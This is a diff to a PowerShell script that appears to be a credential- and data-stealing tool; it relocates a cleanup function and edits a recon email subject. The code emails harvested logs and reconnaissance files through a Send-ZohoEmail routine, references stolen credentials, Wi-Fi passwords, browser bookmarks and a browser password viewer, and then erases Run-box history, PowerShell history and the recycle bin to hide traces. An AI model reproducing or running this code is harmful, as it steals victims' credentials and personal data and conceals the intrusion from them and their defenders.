@@ -183,43 +183,6 @@ function RunWBPV {
         Write-Host "Operation $step / $totalSteps is done."
         SetEmailSentFalse
 }
-function ClearCache {
-
-    #email log file
-    if (-not $isEmailSent) {
-        # Email parameters
-        $subject = "$env:USERNAME: Logs - Sent on $currentDateTime"
-        $attachments = @("$env:TEMP\example-logs.txt")  # Array of attachment file paths
-        Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
-    } 
-
-    # RunWBPV
-    Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
-    Remove-Item "$env:TEMP\example.txt" -Force -ErrorAction SilentlyContinue
-    Remove-Item "$env:TEMP\example.exe" -Force -ErrorAction SilentlyContinue
-    Remove-Item "$env:TEMP\Cred.ps1" -Force -ErrorAction SilentlyContinue
-    # # GetWifiPasswords
-    # Remove-Item "$env:TEMP\wifi.txt" -Force -ErrorAction SilentlyContinue
-    # # GatherSystemInfo
-    # $tempFolderPath = [System.IO.Path]::GetTempPath()
-    # $folderToDelete = Join-Path -Path $tempFolderPath -ChildPath "SystemInfo"
-    # Remove-Item -Path $folderToDelete -Recurse -Force -ErrorAction SilentlyContinue
-    # ShowTree
-    # Remove-Item "$env:TEMP\tree.txt" -Force -ErrorAction SilentlyContinue
-    Remove-Item "$env:TEMP\example-logs.txt" -Force -ErrorAction SilentlyContinue
-    # # Get Bookmarks
-    # Remove-Item "$env:TEMP\chrome_bookmarks.txt" -Force -ErrorAction SilentlyContinue
-    # Remove-Item "$env:TEMP\edge_bookmarks.txt" -Force -ErrorAction SilentlyContinue
-
-    # Delete run box history
-    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
-    # Delete powershell history
-    Remove-Item (Get-PSreadlineOption).HistorySavePath
-
-    # Deletes contents of recycle bin
-    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
-}
 function Get-fullName {
     try {$fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")}
     catch { Write-Error "No name was detected";return $env:UserName;-ErrorAction SilentlyContinue } # If no name is detected function will return $env:UserName # Write Error is just for troubleshooting 
@@ -517,7 +480,7 @@ function Recon{
     # SEND to EMAIL or WEBHOOK
     if (-not $isEmailSent) {
         # Email parameters
-        $subject = "$env:USERNAME: Tree Show - Sent on $currentDateTime"
+        $subject = "$env:userprofile: Advance Recon - Sent on $currentDateTime"
         $attachments = @("$env:TEMP\$FileName")  # Array of attachment file paths
         Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
     } 
@@ -525,6 +488,43 @@ function Recon{
     SetEmailSentFalse
 
     ############################################################################################################################################################
+}
+function ClearCache {
+
+    #email log file
+    if (-not $isEmailSent) {
+        # Email parameters
+        $subject = "$env:USERNAME: Logs - Sent on $currentDateTime"
+        $attachments = @("$env:TEMP\example-logs.txt")  # Array of attachment file paths
+        Send-ZohoEmail -Subject $subject -Attachments $attachments # Send the email
+    } 
+
+    # RunWBPV
+    Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
+    Remove-Item "$env:TEMP\example.txt" -Force -ErrorAction SilentlyContinue
+    Remove-Item "$env:TEMP\example.exe" -Force -ErrorAction SilentlyContinue
+    Remove-Item "$env:TEMP\Cred.ps1" -Force -ErrorAction SilentlyContinue
+    # # GetWifiPasswords
+    # Remove-Item "$env:TEMP\wifi.txt" -Force -ErrorAction SilentlyContinue
+    # # GatherSystemInfo
+    # $tempFolderPath = [System.IO.Path]::GetTempPath()
+    # $folderToDelete = Join-Path -Path $tempFolderPath -ChildPath "SystemInfo"
+    # Remove-Item -Path $folderToDelete -Recurse -Force -ErrorAction SilentlyContinue
+    # ShowTree
+    # Remove-Item "$env:TEMP\tree.txt" -Force -ErrorAction SilentlyContinue
+    Remove-Item "$env:TEMP\example-logs.txt" -Force -ErrorAction SilentlyContinue
+    # # Get Bookmarks
+    # Remove-Item "$env:TEMP\chrome_bookmarks.txt" -Force -ErrorAction SilentlyContinue
+    # Remove-Item "$env:TEMP\edge_bookmarks.txt" -Force -ErrorAction SilentlyContinue
+
+    # Delete run box history
+    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+    # Delete powershell history
+    Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+    # Deletes contents of recycle bin
+    Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 }
 
 for ($step = 1; $step -le $totalSteps; $step++) {
